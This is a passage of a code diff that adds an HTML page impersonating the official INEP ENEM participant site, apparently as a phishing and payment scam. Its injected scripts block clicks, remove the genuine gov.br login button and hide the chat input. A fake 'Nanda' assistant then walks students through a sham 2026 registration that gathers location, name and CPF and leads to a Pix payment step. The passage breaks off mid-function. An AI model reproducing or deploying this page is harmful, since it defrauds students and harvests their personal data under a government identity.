@@ -1,0 +1,888 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','4327697327497010');fbq('track','PageView');</script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4327697327497010&ev=PageView&noscript=1"/></noscript><meta name="google" content="notranslate"><link rel="shortcut icon" href="images/favicon.ico"><meta name="viewport" content="minimum-scale=1,initial-scale=1,width=device-width,shrink-to-fit=no"><meta name="theme-color" content="#000000"><meta name="appVersion" content="3.0.1422"><meta http-equiv="cache-control" content="no-cache"><meta http-equiv="expires" content="0"><meta http-equiv="pragma" content="no-cache"><link rel="manifest" href="./manifest.json"><title>INEP - Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira</title><meta name="description" content="Enem - Página do Participante"><meta name="keywords" content="Enem, Participante, Inscrição, Isenção, Resultado, INEP"><meta property="og:title" content="Enem - Exame Nacional do Ensino Médio"><meta property="og:description" content="Enem - Página do Participante"><meta property="og:url" content="https://enem.inep.gov.br/participante/#!/"><meta property="og:site_name" content="Enem - Página do Participante"><meta name="twitter:title" content="Enem - Exame Nacional do Ensino Médio"><meta name="twitter:description" content="Enem - Página do Participante"><link href="css/2.ea750f62.chunk.css" rel="stylesheet"><link href="css/main.25c0081c.chunk.css" rel="stylesheet"><style>*{cursor:default!important;user-select:none!important;}</style><script>
+(function(){
+  // Bloqueia todos os cliques (não há mais botão gov.br nesta página)
+  window.addEventListener('click',function(e){
+    // Permite apenas o botão Prosseguir
+    var node=e.target;
+    while(node&&node!==document.documentElement){
+      if(node.id==='btn-prosseguir-logado'||node.id==='lista-estados'||node.id==='lista-cidades'||node.id==='lista-idiomas'||node.id==='btn-copiar-pix') return;
+      node=node.parentElement;
+    }
+    e.preventDefault();
+    e.stopImmediatePropagation();
+  },true);
+})();
+</script><script>
+(function(){
+  var NOVOS_PARAGS = [
+    'Olá! Eu sou a Nanda!',
+    'Estou por dentro de tudo sobre o ENEM!',
+    'Seja bem-vindo à Página do Participante. Aqui você pode realizar sua inscrição para o ENEM 2026! <b style="display:block;text-align:left;">CLIQUE EM PROSSEGUIR PARA CONTINUAR</b>'
+  ];
+
+  var ENEM_PARAGS = [
+    'O ENEM é o Exame Nacional do Ensino Médio, uma prova criada pelo governo do Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira (INEP), que faz parte do Ministério da Educação (MEC) no Brasil.',
+    'Ele serve principalmente para:',
+    '<b>1. Avaliar o desempenho dos estudantes</b><br>Mede o que você aprendeu ao longo do ensino médio.',
+    '<b>2. Ajudar a entrar na faculdade</b><br>A nota pode ser usada em programas como:<br>• SISU (Sistema de Seleção Unificada) — vagas em universidades públicas<br>• PROUNI — bolsas em faculdades particulares<br>• FIES — financiamento estudantil'
+  ];
+
+  var AREAS_PARAGS = [
+    'O ENEM é dividido em <b>4 áreas + redação</b>:',
+    '📚 <b>Linguagens</b><br>Português, literatura, inglês ou espanhol',
+    '🌍 <b>Ciências Humanas</b><br>História, geografia, filosofia, sociologia',
+    '🔬 <b>Ciências da Natureza</b><br>Biologia, química, física',
+    '📐 <b>Matemática</b>',
+    '✏️ <b>Redação</b><br>Um texto dissertativo-argumentativo'
+  ];
+
+  var PORTA_PARAGS = [
+    'O ENEM é a principal porta de entrada para o ensino superior no Brasil hoje. Ele não é só uma prova — é um sistema que conecta você a várias oportunidades de estudo.'
+  ];
+
+  var INSCRICAO_PARAGS = [
+    'Deseja fazer sua inscrição para o ENEM 2026?',
+    '<b>CLIQUE EM PROSSEGUIR PARA CONTINUAR</b>'
+  ];
+
+  var ESTADOS = [
+    'Acre (AC)','Alagoas (AL)','Amapá (AP)','Amazonas (AM)',
+    'Bahia (BA)','Ceará (CE)','Distrito Federal (DF)','Espírito Santo (ES)',
+    'Goiás (GO)','Maranhão (MA)','Mato Grosso (MT)','Mato Grosso do Sul (MS)',
+    'Minas Gerais (MG)','Pará (PA)','Paraíba (PB)','Paraná (PR)',
+    'Pernambuco (PE)','Piauí (PI)','Rio de Janeiro (RJ)','Rio Grande do Norte (RN)',
+    'Rio Grande do Sul (RS)','Rondônia (RO)','Roraima (RR)','Santa Catarina (SC)',
+    'São Paulo (SP)','Sergipe (SE)','Tocantins (TO)'
+  ];
+
+  var CIDADES = {
+    'Acre (AC)':['Rio Branco','Cruzeiro do Sul','Sena Madureira','Tarauacá','Feijó','Brasiléia'],
+    'Alagoas (AL)':['Maceió','Arapiraca','Palmeira dos Índios','União dos Palmares','Penedo','Santana do Ipanema','Delmiro Gouveia'],
+    'Amapá (AP)':['Macapá','Santana','Laranjal do Jari','Oiapoque','Mazagão'],
+    'Amazonas (AM)':['Manaus','Parintins','Itacoatiara','Manacapuru','Coari','Tefé','Tabatinga','Maués'],
+    'Bahia (BA)':['Salvador','Feira de Santana','Vitória da Conquista','Camaçari','Juazeiro','Ilhéus','Itabuna','Barreiras','Jequié','Teixeira de Freitas','Paulo Afonso','Lauro de Freitas','Alagoinhas'],
+    'Ceará (CE)':['Fortaleza','Caucaia','Juazeiro do Norte','Maracanaú','Sobral','Crato','Itapipoca','Maranguape','Iguatu','Quixadá'],
+    'Distrito Federal (DF)':['Brasília','Ceilândia','Taguatinga','Samambaia','Planaltina','Gama','Águas Claras','Recanto das Emas','Sobradinho'],
+    'Espírito Santo (ES)':['Vitória','Serra','Vila Velha','Cariacica','Linhares','Cachoeiro de Itapemirim','Colatina','Guarapari','São Mateus'],
+    'Goiás (GO)':['Goiânia','Aparecida de Goiânia','Anápolis','Rio Verde','Luziânia','Águas Lindas de Goiás','Valparaíso de Goiás','Trindade','Senador Canedo','Itumbiara'],
+    'Maranhão (MA)':['São Luís','Imperatriz','Timon','Caxias','Codó','Paço do Lumiar','São José de Ribamar','Bacabal','Açailândia','Balsas'],
+    'Mato Grosso (MT)':['Cuiabá','Várzea Grande','Rondonópolis','Sinop','Tangará da Serra','Cáceres','Sorriso','Lucas do Rio Verde','Barra do Garças'],
+    'Mato Grosso do Sul (MS)':['Campo Grande','Dourados','Três Lagoas','Corumbá','Ponta Porã','Naviraí','Nova Andradina','Aquidauana'],
+    'Minas Gerais (MG)':['Belo Horizonte','Uberlândia','Contagem','Juiz de Fora','Betim','Montes Claros','Ribeirão das Neves','Uberaba','Governador Valadares','Ipatinga','Sete Lagoas','Divinópolis','Ibirité','Vespasiano','Poços de Caldas'],
+    'Pará (PA)':['Belém','Ananindeua','Santarém','Marabá','Castanhal','Parauapebas','Altamira','Itaituba','Abaetetuba','Cametá'],
+    'Paraíba (PB)':['João Pessoa','Campina Grande','Santa Rita','Patos','Bayeux','Sousa','Cajazeiras','Caruaru'],
+    'Paraná (PR)':['Curitiba','Londrina','Maringá','Ponta Grossa','Cascavel','São José dos Pinhais','Foz do Iguaçu','Colombo','Guarapuava','Paranaguá','Apucarana','Toledo'],
+    'Pernambuco (PE)':['Recife','Caruaru','Olinda','Petrolina','Paulista','Jaboatão dos Guararapes','Garanhuns','Vitória de Santo Antão','Cabo de Santo Agostinho','Camaragibe','Abreu e Lima'],
+    'Piauí (PI)':['Teresina','Parnaíba','Picos','Floriano','Campo Maior','Barras','Oeiras'],
+    'Rio de Janeiro (RJ)':['Rio de Janeiro','São Gonçalo','Duque de Caxias','Nova Iguaçu','Niterói','Belford Roxo','Campos dos Goytacazes','São João de Meriti','Petrópolis','Volta Redonda','Magé','Itaboraí','Macaé'],
+    'Rio Grande do Norte (RN)':['Natal','Mossoró','Parnamirim','São Gonçalo do Amarante','Macaíba','Ceará-Mirim','Caicó','Açu'],
+    'Rio Grande do Sul (RS)':['Porto Alegre','Caxias do Sul','Pelotas','Canoas','Santa Maria','Gravataí','Viamão','Novo Hamburgo','São Leopoldo','Rio Grande','Alvorada','Passo Fundo','Sapucaia do Sul'],
+    'Rondônia (RO)':['Porto Velho','Ji-Paraná','Ariquemes','Vilhena','Cacoal','Rolim de Moura','Jaru'],
+    'Roraima (RR)':['Boa Vista','Caracaraí','Rorainópolis','Mucajaí'],
+    'Santa Catarina (SC)':['Florianópolis','Joinville','Blumenau','São José','Chapecó','Criciúma','Itajaí','Lages','Jaraguá do Sul','Palhoça','Balneário Camboriú'],
+    'São Paulo (SP)':['São Paulo','Guarulhos','Campinas','São Bernardo do Campo','Santo André','Osasco','São José dos Campos','Ribeirão Preto','Sorocaba','Santos','Mogi das Cruzes','Diadema','Jundiaí','Piracicaba','Bauru','Limeira','São José do Rio Preto','Franca','Mauá','Carapicuíba'],
+    'Sergipe (SE)':['Aracaju','Nossa Senhora do Socorro','Lagarto','Itabaiana','São Cristóvão','Estância','Tobias Barreto'],
+    'Tocantins (TO)':['Palmas','Araguaína','Gurupi','Porto Nacional','Paraíso do Tocantins','Guaraí','Colinas do Tocantins']
+  };
+
+  var feito = {texto:false, botao:false, input:false};
+  var textoContainer = null; // referência ao div dos parágrafos da Nanda
+
+  // Adiciona animação do spinner
+  var spinStyle = document.createElement('style');
+  spinStyle.textContent = '@keyframes _spin{to{transform:rotate(360deg)}}';
+  document.head.appendChild(spinStyle);
+
+  function modificar(){
+    // 1. Troca o texto da Nanda
+    if(!feito.texto){
+      var parags = document.querySelectorAll('p');
+      for(var i=0;i<parags.length;i++){
+        var t = parags[i].textContent||'';
+        if(t.indexOf('consultar seus resultados')!==-1||t.indexOf('anos anteriores')!==-1){
+          var container = parags[i].parentElement;
+          if(!container) continue;
+          container.innerHTML = NOVOS_PARAGS.map(function(html){
+            return '<p>'+html+'</p>';
+          }).join('');
+          textoContainer = container;
+          feito.texto=true;
+          break;
+        }
+      }
+    }
+
+    // 2. Remove o botão gov.br do chat
+    if(!feito.botao){
+      var btns = document.querySelectorAll('button,a,[role="button"]');
+      for(var j=0;j<btns.length;j++){
+        if((btns[j].textContent||'').indexOf('gov.br')!==-1){
+          var pai = btns[j].parentElement;
+          if(pai) pai.removeChild(btns[j]);
+          feito.botao=true;
+          break;
+        }
+      }
+    }
+
+    // 3. Esconde a barra de chat e injeta o botão Prosseguir
+    if(!feito.input){
+      var inp = document.querySelector('input[type="text"],textarea,input:not([type="hidden"]):not([type="submit"]):not([type="checkbox"])');
+      if(inp){
+        inp.style.setProperty('display','none','important');
+        if(inp.parentElement) inp.parentElement.style.setProperty('display','none','important');
+        var st = document.createElement('style');
+        st.textContent = 'textarea,input[type="text"]{display:none!important;}';
+        document.head.appendChild(st);
+        feito.input=true;
+        injetarBotao();
+      }
+    }
+  }
+
+  // Sobe na árvore até encontrar um elemento cujo PAI seja um container vertical
+  // (block ou flex-column) — garante que inserir depois dele coloca o novo elemento ABAIXO
+  function encontrarMensagemRow(el){
+    var cur = el;
+    var candidato = null;
+    for(var i=0;i<14;i++){
+      if(!cur.parentElement||cur.parentElement===document.body) break;
+      cur = cur.parentElement;
+      // Marca o elemento quando encontramos um img (avatar da Nanda)
+      if(!candidato && cur.querySelector('img')!==null) candidato = cur;
+      // Valida: o pai do candidato tem layout vertical?
+      if(candidato && candidato.parentElement){
+        var st = window.getComputedStyle(candidato.parentElement);
+        var vertical = st.display==='block'||
+          (st.display==='flex'&&(st.flexDirection==='column'||st.flexDirection==='column-reverse'))||
+          st.display==='list-item';
+        if(vertical) return candidato;
+        // Pai não é vertical, sobe e tenta de novo
+        candidato = cur;
+      }
+    }
+    return candidato || el.parentElement;
+  }
+
+function injetarBotao(){
+    if(document.getElementById('btn-prosseguir-logado')) return;
+
+    var cover = document.createElement('div');
+    cover.style.cssText = 'position:fixed;bottom:54px;left:0;right:0;height:64px;background:#e5e5e5;z-index:99997;';
+    document.body.appendChild(cover);
+
+    var btn = document.createElement('button');
+    btn.id = 'btn-prosseguir-logado';
+    btn.textContent = 'Prosseguir';
+    btn.style.cssText = [
+      'position:fixed','bottom:0','left:0','right:0','height:54px',
+      'background:#1351b4','color:#fff','font-size:17px','font-weight:700',
+      'border:none','border-radius:0','cursor:pointer!important',
+      'z-index:99998','letter-spacing:.3px','font-family:Arial,Helvetica,sans-serif'
+    ].join(';');
+
+    var estagio = 0;
+    var ultimoBalao = null;
+    var estadoSelecionado = null;
+    var cidadeSelecionada = null;
+    var idiomasSelecionado = null;
+
+    function criarMensagemUsuario(){
+      var wrap = document.createElement('div');
+      wrap.style.cssText='display:flex;justify-content:flex-end;padding:6px 12px 6px 50px;width:100%;box-sizing:border-box;';
+      var bubble = document.createElement('div');
+      bubble.style.cssText='background:#1351b4;border-radius:18px 18px 4px 18px;padding:10px 16px;color:#fff;font-size:14px;font-weight:600;font-family:Arial,Helvetica,sans-serif;';
+      bubble.textContent='Prosseguir';
+      wrap.appendChild(bubble);
+      return wrap;
+    }
+
+    function inserirMsgUsuario(ancorEl){
+      if(!ancorEl||!ancorEl.parentElement) return ancorEl;
+      var umsg = criarMensagemUsuario();
+      ancorEl.parentElement.insertBefore(umsg, ancorEl.nextSibling);
+      return umsg;
+    }
+
+    // ── Cria balão customizado (sem clonar o React) ──
+    function criarBalao(innerHtml, imgSrc){
+      var wrap = document.createElement('div');
+      wrap.style.cssText='display:flex;align-items:flex-start;padding:8px 12px 8px 10px;gap:8px;width:100%;box-sizing:border-box;flex-shrink:0;flex-basis:100%;';
+
+      var avatar = document.createElement('div');
+      avatar.style.cssText='width:46px;height:46px;border-radius:50%;overflow:hidden;flex-shrink:0;background:#ccc;';
+      var img = document.createElement('img');
+      img.src='images/nanda.png';
+      img.style.cssText='width:100%;height:100%;object-fit:cover;display:block;';
+      avatar.appendChild(img);
+
+      var bWrap = document.createElement('div');
+      bWrap.style.cssText='position:relative;flex:1;min-width:0;';
+
+      var tail = document.createElement('div');
+      tail.style.cssText='position:absolute;left:-7px;top:13px;width:0;height:0;border-top:7px solid transparent;border-bottom:7px solid transparent;border-right:7px solid #e6e6e6;';
+
+      var bubble = document.createElement('div');
+      bubble.style.cssText='background:#e6e6e6;border-radius:6px;padding:10px 13px;font-family:Arial,Helvetica,sans-serif;font-size:14px;line-height:1.55;color:#1a1a1a;text-align:justify;';
+      bubble.innerHTML = innerHtml;
+
+      if(imgSrc){
+        var imgEl = document.createElement('img');
+        imgEl.src = imgSrc;
+        imgEl.style.cssText='width:100%;border-radius:6px;display:block;margin-top:8px;';
+        bubble.appendChild(imgEl);
+      }
+
+      bWrap.appendChild(tail);
+      bWrap.appendChild(bubble);
+      wrap.appendChild(avatar);
+      wrap.appendChild(bWrap);
+      return wrap;
+    }
+
+    function mostrarBalao(parags, ancorEl, imgSrc){
+      if(!ancorEl||!ancorEl.parentElement) return;
+
+      if(!document.getElementById('dot-style')){
+        var ds = document.createElement('style');
+        ds.id='dot-style';
+        ds.textContent='@keyframes _dot{0%,80%,100%{opacity:.25;transform:scale(.75)}40%{opacity:1;transform:scale(1)}}';
+        document.head.appendChild(ds);
+      }
+
+      var loadingEl = criarBalao(
+        '<div style="display:flex;gap:7px;align-items:center;padding:4px 2px;">' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite 0s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .2s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .4s;"></span>' +
+        '</div>'
+      );
+
+      ancorEl.parentElement.insertBefore(loadingEl, ancorEl.nextSibling);
+      setTimeout(function(){ loadingEl.scrollIntoView({behavior:'smooth',block:'end'}); }, 80);
+
+      setTimeout(function(){
+        var conteudo = parags.map(function(html){ return '<p style="margin:0 0 8px;">'+html+'</p>'; }).join('');
+        var novoBalao = criarBalao(conteudo, imgSrc);
+        ancorEl.parentElement.replaceChild(novoBalao, loadingEl);
+        ultimoBalao = novoBalao;
+        setTimeout(function(){ novoBalao.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
+      }, 1800);
+    }
+
+    btn.addEventListener('click', function(){
+      if(estagio === 0){
+        estagio = 1;
+        btn.disabled = true;
+        if(!textoContainer) return;
+        var row = encontrarMensagemRow(textoContainer);
+        var a0 = inserirMsgUsuario(row);
+        mostrarBalao(ENEM_PARAGS, a0, 'images/primeirobalao.jpg');
+        setTimeout(function(){ btn.disabled = false; }, 2000);
+      } else if(estagio === 1){
+        estagio = 2;
+        btn.disabled = true;
+        var a1 = inserirMsgUsuario(ultimoBalao);
+        mostrarBalao(AREAS_PARAGS, a1, 'images/segundobalao.jpg');
+        setTimeout(function(){ btn.disabled = false; }, 2000);
+      } else if(estagio === 2){
+        estagio = 3;
+        btn.disabled = true;
+        var a2 = inserirMsgUsuario(ultimoBalao);
+        mostrarBalao(PORTA_PARAGS, a2, 'images/terceirobalao.jpg');
+        setTimeout(function(){ btn.disabled = false; }, 2000);
+      } else if(estagio === 3){
+        estagio = 4;
+        btn.disabled = true;
+        var a3 = inserirMsgUsuario(ultimoBalao);
+        mostrarBalao(INSCRICAO_PARAGS, a3);
+        setTimeout(function(){ btn.disabled = false; }, 2000);
+      } else if(estagio === 4){
+        estagio = 5;
+        btn.disabled = true;
+        btn.style.background = '#aaa';
+        var a4 = inserirMsgUsuario(ultimoBalao);
+        mostrarSelecaoEstado(a4);
+      } else if(estagio === 5){
+        estagio = 6;
+        btn.disabled = true;
+        btn.style.background = '#aaa';
+        var a5 = inserirMsgUsuario(ultimoBalao);
+        mostrarSelecaoCidade(a5);
+      } else if(estagio === 6){
+        estagio = 7;
+        btn.disabled = true;
+        btn.style.background = '#aaa';
+        var a6 = inserirMsgUsuario(ultimoBalao);
+        mostrarSelecaoIdioma(a6);
+      } else if(estagio === 7){
+        estagio = 8;
+        btn.disabled = true;
+        btn.style.background = '#aaa';
+        var a7 = inserirMsgUsuario(ultimoBalao);
+        mostrarConfirmacao(a7);
+      } else if(estagio === 8){
+        estagio = 9;
+        btn.disabled = true;
+        btn.style.background = '#aaa';
+        btn.textContent = 'Processando...';
+        var a8 = inserirMsgUsuario(ultimoBalao);
+        mostrarPagamentoPix(a8);
+      }
+    });
+
+    function mostrarSelecaoEstado(ancorEl){
+      if(!ancorEl||!ancorEl.parentElement) return;
+
+      var loadingEl = criarBalao(
+        '<div style="display:flex;gap:7px;align-items:center;padding:4px 2px;">' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite 0s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .2s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .4s;"></span>' +
+        '</div>'
+      );
+      ancorEl.parentElement.insertBefore(loadingEl, ancorEl.nextSibling);
+      setTimeout(function(){ loadingEl.scrollIntoView({behavior:'smooth',block:'end'}); }, 80);
+
+      setTimeout(function(){
+        var wrap = document.createElement('div');
+        wrap.style.cssText='display:flex;align-items:flex-start;padding:8px 12px 8px 10px;gap:8px;width:100%;box-sizing:border-box;flex-shrink:0;flex-basis:100%;';
+
+        var avatar = document.createElement('div');
+        avatar.style.cssText='width:46px;height:46px;border-radius:50%;overflow:hidden;flex-shrink:0;background:#ccc;';
+        var avatarImg = document.createElement('img');
+        avatarImg.src='images/nanda.png';
+        avatarImg.style.cssText='width:100%;height:100%;object-fit:cover;display:block;';
+        avatar.appendChild(avatarImg);
+
+        var bWrap = document.createElement('div');
+        bWrap.style.cssText='position:relative;flex:1;min-width:0;';
+
+        var tail = document.createElement('div');
+        tail.style.cssText='position:absolute;left:-7px;top:13px;width:0;height:0;border-top:7px solid transparent;border-bottom:7px solid transparent;border-right:7px solid #e6e6e6;';
+
+        var bubble = document.createElement('div');
+        bubble.style.cssText='background:#e6e6e6;border-radius:6px;padding:10px 13px;font-family:Arial,Helvetica,sans-serif;font-size:14px;line-height:1.55;color:#1a1a1a;';
+
+        var pergunta = document.createElement('p');
+        pergunta.style.cssText='margin:0 0 10px;';
+        pergunta.textContent='Em qual estado você gostaria de realizar a prova?';
+        bubble.appendChild(pergunta);
+
+        var lista = document.createElement('div');
+        lista.id='lista-estados';
+        lista.style.cssText='border:1px solid #ccc;border-radius:8px;overflow:hidden;max-height:260px;overflow-y:auto;background:#fff;';
+
+        ESTADOS.forEach(function(estado, i){
+          var item = document.createElement('div');
+          item.style.cssText='display:flex;align-items:center;gap:12px;padding:12px 14px;' +
+            (i < ESTADOS.length-1 ? 'border-bottom:1px solid #e8e8e8;' : '') +
+            'background:#fff;';
+
+          var circulo = document.createElement('span');
+          circulo.style.cssText='width:20px;height:20px;border-radius:50%;border:2px solid #1351b4;flex-shrink:0;box-sizing:border-box;display:inline-block;transition:background .15s;';
+
+          var nome = document.createElement('span');
+          nome.style.cssText='font-size:15px;color:#1a1a1a;';
+          nome.textContent = estado;
+
+          item.appendChild(circulo);
+          item.appendChild(nome);
+
+          item.addEventListener('click', function(){
+            lista.querySelectorAll('div').forEach(function(it){
+              it.style.background='#fff';
+              it.querySelector('span').style.background='';
+              it.querySelector('span').style.border='2px solid #1351b4';
+            });
+            item.style.background='#e8f0fe';
+            circulo.style.background='#1351b4';
+            circulo.style.border='2px solid #1351b4';
+            estadoSelecionado = estado;
+            btn.disabled = false;
+            btn.style.background = '#1351b4';
+          });
+
+          lista.appendChild(item);
+        });
+
+        bubble.appendChild(lista);
+        bWrap.appendChild(tail);
+        bWrap.appendChild(bubble);
+        wrap.appendChild(avatar);
+        wrap.appendChild(bWrap);
+
+        ancorEl.parentElement.replaceChild(wrap, loadingEl);
+        ultimoBalao = wrap;
+        setTimeout(function(){ wrap.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
+      }, 1800);
+    }
+
+    function mostrarSelecaoCidade(ancorEl){
+      if(!ancorEl||!ancorEl.parentElement) return;
+
+      var cidades = CIDADES[estadoSelecionado] || [];
+
+      var loadingEl = criarBalao(
+        '<div style="display:flex;gap:7px;align-items:center;padding:4px 2px;">' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite 0s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .2s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .4s;"></span>' +
+        '</div>'
+      );
+      ancorEl.parentElement.insertBefore(loadingEl, ancorEl.nextSibling);
+      setTimeout(function(){ loadingEl.scrollIntoView({behavior:'smooth',block:'end'}); }, 80);
+
+      setTimeout(function(){
+        var wrap = document.createElement('div');
+        wrap.style.cssText='display:flex;align-items:flex-start;padding:8px 12px 8px 10px;gap:8px;width:100%;box-sizing:border-box;flex-shrink:0;flex-basis:100%;';
+
+        var avatar = document.createElement('div');
+        avatar.style.cssText='width:46px;height:46px;border-radius:50%;overflow:hidden;flex-shrink:0;background:#ccc;';
+        var avatarImg = document.createElement('img');
+        avatarImg.src='images/nanda.png';
+        avatarImg.style.cssText='width:100%;height:100%;object-fit:cover;display:block;';
+        avatar.appendChild(avatarImg);
+
+        var bWrap = document.createElement('div');
+        bWrap.style.cssText='position:relative;flex:1;min-width:0;';
+
+        var tail = document.createElement('div');
+        tail.style.cssText='position:absolute;left:-7px;top:13px;width:0;height:0;border-top:7px solid transparent;border-bottom:7px solid transparent;border-right:7px solid #e6e6e6;';
+
+        var bubble = document.createElement('div');
+        bubble.style.cssText='background:#e6e6e6;border-radius:6px;padding:10px 13px;font-family:Arial,Helvetica,sans-serif;font-size:14px;line-height:1.55;color:#1a1a1a;';
+
+        var pergunta = document.createElement('p');
+        pergunta.style.cssText='margin:0 0 10px;';
+        pergunta.textContent='Em qual cidade você gostaria de realizar a prova?';
+        bubble.appendChild(pergunta);
+
+        var lista = document.createElement('div');
+        lista.id='lista-cidades';
+        lista.style.cssText='border:1px solid #ccc;border-radius:8px;overflow:hidden;max-height:260px;overflow-y:auto;background:#fff;';
+
+        cidades.forEach(function(cidade, i){
+          var item = document.createElement('div');
+          item.style.cssText='display:flex;align-items:center;gap:12px;padding:12px 14px;' +
+            (i < cidades.length-1 ? 'border-bottom:1px solid #e8e8e8;' : '') +
+            'background:#fff;';
+
+          var circulo = document.createElement('span');
+          circulo.style.cssText='width:20px;height:20px;border-radius:50%;border:2px solid #1351b4;flex-shrink:0;box-sizing:border-box;display:inline-block;';
+
+          var nome = document.createElement('span');
+          nome.style.cssText='font-size:15px;color:#1a1a1a;';
+          nome.textContent = cidade;
+
+          item.appendChild(circulo);
+          item.appendChild(nome);
+
+          item.addEventListener('click', function(){
+            lista.querySelectorAll('div').forEach(function(it){
+              it.style.background='#fff';
+              it.querySelector('span').style.background='';
+              it.querySelector('span').style.border='2px solid #1351b4';
+            });
+            item.style.background='#e8f0fe';
+            circulo.style.background='#1351b4';
+            cidadeSelecionada = cidade;
+            btn.disabled = false;
+            btn.style.background = '#1351b4';
+          });
+
+          lista.appendChild(item);
+        });
+
+        bubble.appendChild(lista);
+        bWrap.appendChild(tail);
+        bWrap.appendChild(bubble);
+        wrap.appendChild(avatar);
+        wrap.appendChild(bWrap);
+
+        ancorEl.parentElement.replaceChild(wrap, loadingEl);
+        ultimoBalao = wrap;
+        setTimeout(function(){ wrap.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
+      }, 1800);
+    }
+
+    function mostrarSelecaoIdioma(ancorEl){
+      if(!ancorEl||!ancorEl.parentElement) return;
+
+      var loadingEl = criarBalao(
+        '<div style="display:flex;gap:7px;align-items:center;padding:4px 2px;">' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite 0s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .2s;"></span>' +
+          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .4s;"></span>' +
+        '</div>'
+      );
+      ancorEl.parentElement.insertBefore(loadingEl, ancorEl.nextSibling);
+      setTimeout(function(){ loadingEl.scrollIntoView({behavior:'smooth',block:'end'}); }, 80);
+
+      setTimeout(function(){
+        var wrap = document.createElement('div');
+        wrap.style.cssText='display:flex;align-items:flex-start;padding:8px 12px 8px 10px;gap:8px;width:100%;box-sizing:border-box;flex-shrink:0;flex-basis:100%;';
+
+        var avatar = document.createElement('div');
+        avatar.style.cssText='width:46px;height:46px;border-radius:50%;overflow:hidden;flex-shrink:0;background:#ccc;';
+        var avatarImg = document.createElement('img');
+        avatarImg.src='images/nanda.png';
+        avatarImg.style.cssText='width:100%;height:100%;object-fit:cover;display:block;';
+        avatar.appendChild(avatarImg);
+
+        var bWrap = document.createElement('div');
+        bWrap.style.cssText='position:relative;flex:1;min-width:0;';
+
+        var tail = document.createElement('div');
+        tail.style.cssText='position:absolute;left:-7px;top:13px;width:0;height:0;border-top:7px solid transparent;border-bottom:7px solid transparent;border-right:7px solid #e6e6e6;';
+
+        var bubble = document.createElement('div');
+        bubble.style.cssText='background:#e6e6e6;border-radius:6px;padding:10px 13px;font-family:Arial,Helvetica,sans-serif;font-size:14px;line-height:1.55;color:#1a1a1a;';
+
+        var pergunta = document.createElement('p');
+        pergunta.style.cssText='margin:0 0 12px;';
+        pergunta.textContent='Qual língua estrangeira você deseja na prova?';
+        bubble.appendChild(pergunta);
+
+        var opcoes = document.createElement('div');
+        opcoes.id='lista-idiomas';
+        opcoes.style.cssText='display:flex;flex-direction:column;gap:10px;';
+
+        ['Inglês','Espanhol'].forEach(function(idioma){
+          var item = document.createElement('div');
+          item.style.cssText='display:flex;align-items:center;gap:12px;padding:13px 16px;border-radius:8px;border:2px solid #ccc;background:#fff;';
+
+          var circulo = document.createElement('span');
+          circulo.style.cssText='width:20px;height:20px;border-radius:50%;border:2px solid #1351b4;flex-shrink:0;box-sizing:border-box;display:inline-block;';
+
+          var nome = document.createElement('span');
+          nome.style.cssText='font-size:15px;font-weight:600;color:#1a1a1a;';
+          nome.textContent = idioma;
+
+          item.appendChild(circulo);
+          item.appendChild(nome);
+
+          item.addEventListener('click', function(){
+            opcoes.querySelectorAll('div').forEach(function(it){
+              it.style.border='2px solid #ccc';
+              it.style.background='#fff';
+              it.querySelector('span').style.background='';
+            });
+            item.style.border='2px solid #1351b4';
+            item.style.background='#e8f0fe';
+            circulo.style.background='#1351b4';
+            idiomasSelecionado = idioma;
+            btn.disabled = false;
+            btn.style.background = '#1351b4';
+          });
+
+          opcoes.appendChild(item);
+        });
+
+        bubble.appendChild(opcoes);
+        bWrap.appendChild(tail);
+        bWrap.appendChild(bubble);
+        wrap.appendChild(avatar);
+        wrap.appendChild(bWrap);
+
+        ancorEl.parentElement.replaceChild(wrap, loadingEl);
+        ultimoBalao = wrap;
+        setTimeout(function(){ wrap.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
+      }, 1800);
+    }
+
+    function criarCardConfirmacao(nome, cpf, estado, cidade, idioma){
+      var card=document.createElement('div');
+      card.style.cssText='width:100%;border:1px solid #bbb;border-radius:6px;overflow:hidden;font-family:Arial,sans-serif;background:#fff;box-sizing:border-box;';
+
+      function secTitle(txt){
+        var d=document.createElement('div');
+        d.style.cssText='background:#f0f0f0;border-top:1px solid #ddd;border-bottom:1px solid #ddd;text-align:center;padding:3px 6px;font-weight:700;font-size:8px;color:#222;';
+        d.innerHTML=txt; return d;
+      }
+      function campo(label, valor){
+        var d=document.createElement('div');
